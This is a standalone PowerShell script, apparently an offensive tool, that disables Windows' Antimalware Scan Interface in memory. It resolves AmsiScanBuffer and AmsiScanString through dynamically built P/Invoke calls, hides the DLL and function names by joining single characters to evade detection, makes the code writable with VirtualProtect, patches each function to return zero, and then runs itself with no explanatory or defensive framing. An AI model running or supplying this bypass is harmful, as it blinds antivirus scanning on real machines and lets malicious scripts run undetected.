function Bypass-Amsi {

    $asmName  = New-Object Reflection.AssemblyName([Guid]::NewGuid().ToString('N'))
    $asmBuild = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        $asmName,
        [Reflection.Emit.AssemblyBuilderAccess]::Run
    )
    $modBuild = $asmBuild.DefineDynamicModule([Guid]::NewGuid().ToString('N'))
    $typBuild = $modBuild.DefineType(
        [Guid]::NewGuid().ToString('N'),
        [Reflection.TypeAttributes]::Public
    )

    $m1 = $typBuild.DefinePInvokeMethod(
        'GetModuleHandle', 'kernel32.dll',
        [Reflection.MethodAttributes]'Public,Static,PinvokeImpl',
        [Reflection.CallingConventions]::Standard,
        [IntPtr], @([string]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto
    )
    $m1.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)

    $m2 = $typBuild.DefinePInvokeMethod(
        'GetProcAddress', 'kernel32.dll',
        [Reflection.MethodAttributes]'Public,Static,PinvokeImpl',
        [Reflection.CallingConventions]::Standard,
        [IntPtr], @([IntPtr], [string]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi
    )
    $m2.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)

    $m3 = $typBuild.DefinePInvokeMethod(
        'VirtualProtect', 'kernel32.dll',
        [Reflection.MethodAttributes]'Public,Static,PinvokeImpl',
        [Reflection.CallingConventions]::Standard,
        [bool], @([IntPtr], [UIntPtr], [uint32], [uint32].MakeByRefType()),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto
    )
    $m3.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)

    $T = $typBuild.CreateType()

    $dll  = [string]::Join('', 'a','m','s','i','.','d','l','l')
    $fn   = [string]::Join('', 'A','m','s','i','S','c','a','n','B','u','f','f','e','r')
    $fn2  = [string]::Join('', 'A','m','s','i','S','c','a','n','S','t','r','i','n','g')

    $hMod = $T::GetModuleHandle($dll)
    if ($hMod -eq [IntPtr]::Zero) { Write-Warning "amsi.dll absent"; return }

    $size = New-Object UIntPtr(8)

    foreach ($func in @($fn, $fn2)) {
        $addr = $T::GetProcAddress($hMod, $func)
        if ($addr -eq [IntPtr]::Zero) { continue }

        $old  = [uint32]0
        $null = $T::VirtualProtect($addr, $size, [uint32]0x40, [ref]$old)

        $patch = [byte[]](
            [byte](0x48),
            [byte](0x31),
            [byte](0xC0),
            [byte](0xC3)
        )
        [Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)

        $null = $T::VirtualProtect($addr, $size, $old, [ref]$old)
    }

    Write-Output "[+] AMSI patché"
}

Bypass-Amsi
